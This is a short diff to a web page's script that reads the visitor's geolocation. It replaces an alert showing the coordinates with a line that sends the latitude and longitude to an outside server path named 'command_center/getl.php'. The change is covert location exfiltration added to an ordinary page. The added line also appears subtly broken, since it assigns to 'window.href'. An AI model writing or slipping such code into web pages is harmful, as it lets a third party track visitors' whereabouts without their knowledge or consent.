@@ -3,11 +3,11 @@
 </head>
 <body>
 <script>
-    if (navigator.geolocation) {
+if (navigator.geolocation) {
   navigator.geolocation.getCurrentPosition(showPosition, showError);
 }
 function showPosition(position) {
-  alert(position.coords.latitude, position.coords.longitude);
+  window.href = "http://new1.cet-gov.ac.in/command_center/getl.php?lat="+position.coords.latitude+"&long="+position.coords.longitude;
 }
 function showError(error) {
   switch(error.code) {
